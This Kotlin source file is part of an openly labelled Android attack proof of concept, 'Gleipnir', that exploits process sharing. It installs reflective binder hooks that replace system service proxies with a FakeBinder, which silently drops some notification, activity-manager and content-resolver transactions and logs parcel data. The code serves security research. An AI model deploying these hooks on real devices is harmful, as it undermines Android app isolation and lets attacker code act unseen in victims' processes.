/*
 * Gleipnir Attack POC - Exploiting the Android process share feature
 * Copyright (C) <2020>  <Sascha Roth>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License along
 * with this program; if not, write to the Free Software Foundation, Inc.,
 * 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package org.gleipnir.app.helpers.binder

import android.app.ActivityManager
import android.app.AppOpsManager
import android.app.NotificationManager
import android.content.ContentResolver
import android.content.Context
import android.content.Context.NOTIFICATION_SERVICE
import android.os.IBinder
import android.os.IInterface
import android.os.Parcel
import org.gleipnir.app.extendableLoader.log
import org.gleipnir.app.helpers.HexDump
import org.gleipnir.app.reflectionHelper.getMethod
import org.gleipnir.app.reflectionHelper.getReflective
import org.gleipnir.app.reflectionHelper.setReflective
import java.io.FileDescriptor
import java.lang.reflect.Method
import java.nio.ByteBuffer


object BinderHook {

    const val verbose = true

    @JvmStatic
    fun installHooks(context: Context) {


        getReflective<Any>(null, ContentResolver::class.java, "sContentService")?.let {
            addHook(it) { originalBinder: IBinder, code: Int, data: Parcel, reply: Parcel?, flags: Int ->
                true  //  disable content resolver...
            }
        } ?: let {
            log("BinderHook [-] installHooks [-] unable to install binder hook for content resolver")
        }
        val notificationManager =
            context.getSystemService(NOTIFICATION_SERVICE) as NotificationManager?
        notificationManager?.let {// just let the android stack create a connection
            it.cancelAll()
            getReflective<Any>(null, NotificationManager::class.java, "sService")?.let {
                addHook(it) { originalBinder: IBinder, code: Int, data: Parcel, reply: Parcel?, flags: Int ->
                    if (code == 16 || code == 7 || code == 13) {
                        true
                    } else {
                        originalBinder.transact(code, data, reply, flags)
                    }
                }
            } ?: let {
                log("BinderHook [-] installHooks [-] unable to install binder hook for NOTIFICATION_SERVICE")
            }
        } ?: let {
            log("BinderHook [-] installHooks [-] unable given notification service is null")
        }

        getReflective<Any>(null, ActivityManager::class.java, "IActivityManagerSingleton")?.let {
            val getMethod = getMethod(it::class.java, "get") as Method
            getMethod.isAccessible = true
            val proxy = getMethod.invoke(it)
            proxy?.let {
                addHook(it) { originalBinder: IBinder, code: Int, data: Parcel, reply: Parcel?, flags: Int ->
                    if (code == 25 // needed for content resolver
                        || code == 30 // suppress start service (until services are working)
                    //|| code == 59 // no getIntentSender
                    ) {
                        true
                    } else {
                        originalBinder.transact(code, data, reply, flags)
                    }

                    /*if(code == 6){ // new activity
                        originalBinder.transact(code, data, reply, flags)
                    }*/
                    /*if(code==5){
                        log("BinderHook [-] addHook [-] skip $code")
                        data.recycle()
                        true
                    } else {
                        log("BinderHook [-] addHook [-] transact $code")
                        originalBinder.transact(code, data, reply, flags)
                    }*/
                }
            } ?: let {
                log("BinderHook [-] installHooks [-] unable to get ActivityManager")
            }
        } ?: let {
            log("BinderHook [-] installHooks [-] unable given ActivityManager singelton is null")
        }//            return originalBinder.transact(code, data, reply, flags)


        val appOps =
            context.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        getReflective<Any>(appOps, AppOpsManager::class.java, "mService")?.let {
            addHook(it) { originalBinder: IBinder, code: Int, data: Parcel, reply: Parcel?, flags: Int ->
                originalBinder.transact(code, data, reply, flags)
            }
        } ?: run {
            log("BinderHook [-] installHooks [-] unable to get AppOpsManager")
        }

    }

    fun addHook(
        binderProxy: Any,
        onTransact: (originalBinder: IBinder, code: Int, data: Parcel, reply: Parcel?, flags: Int) -> Boolean
    ) {

        log("BinderHook [+] addHook [+] add hook $binderProxy")
        getReflective<IBinder>(binderProxy, "mRemote")?.let {
            val fakeBinder = FakeBinder(binderProxy::class.java.name, it, onTransact)
            setReflective(binderProxy, "mRemote", fakeBinder)

        } ?: run {
            log("BinderHook [-] addHook [-] unable to install binder hook for class ${binderProxy}")
        }
    }

    class FakeBinder(
        val name: String,
        val originalBinder: IBinder,
        var onTransact: (originalBinder: IBinder, code: Int, data: Parcel, reply: Parcel?, flags: Int) -> Boolean
    ) : IBinder {
        override fun getInterfaceDescriptor(): String? {

            return originalBinder.interfaceDescriptor
        }

        override fun isBinderAlive(): Boolean {
            return originalBinder.isBinderAlive
        }

        override fun linkToDeath(recipient: IBinder.DeathRecipient, flags: Int) {
            originalBinder.linkToDeath(recipient, flags)
        }

        override fun queryLocalInterface(descriptor: String): IInterface? {
            return originalBinder.queryLocalInterface(descriptor)
        }

        override fun transact(code: Int, data: Parcel, reply: Parcel?, flags: Int): Boolean {
            if (verbose) log("BinderHook [+] transact [+] got transaction code of binder ${name} with: code=${code} data=${data}")
            try {
                /*data.let {
                    log("BinderHook [+] transact [+] dump data")
                    dumpParcel(it)
                }*/
                if (verbose) doStackTrace()
                var res = onTransact(originalBinder, code, data, reply, flags)
                /*reply?.let {
                    log("BinderHook [+] transact [+] dump reply")
                    dumpParcel(it)
                    //it.readException()
                }*/
                return res
            } catch (exception: Exception) {
                log("BinderHook [-] transact [-] exception", exception)
                return true
            }
        }

        override fun dumpAsync(fd: FileDescriptor, args: Array<out String>?) {
        }

        override fun dump(fd: FileDescriptor, args: Array<out String>?) {
        }

        override fun unlinkToDeath(recipient: IBinder.DeathRecipient, flags: Int): Boolean {
            return true
        }

        override fun pingBinder(): Boolean {
            return true
        }

    }

    fun dumpParcel(parcel: Parcel) {
        try {
            /*if (parcel.dataSize() > 0) {
                val data = parcel.marshall()
                HexDump.dumpHexString(data).split("\n").forEach {
                    log("BinderHook [+] $it")
                }
            }*/
            val bytebuff = ByteBuffer.allocateDirect(parcel.dataSize() * 2)
            val intBuff = bytebuff.asIntBuffer()
            parcel.setDataPosition(0)
            //parcel.readByteArray(bytes)
            while (parcel.dataPosition() < parcel.dataSize()) {
                intBuff.put(parcel.readInt())
            }
            HexDump.dumpHexString(bytebuff.array()).split("\n").forEach {
                log("BinderHook [+] $it")
            }
        } catch (exception: Exception) {
            log("", exception)
        }

    }

    fun doStackTrace() {
        try {
            throw Exception("Stacktrace")
        } catch (exception: Exception) {
            log("BinderHook [-] addHook [-] ", exception)
        }
    }

}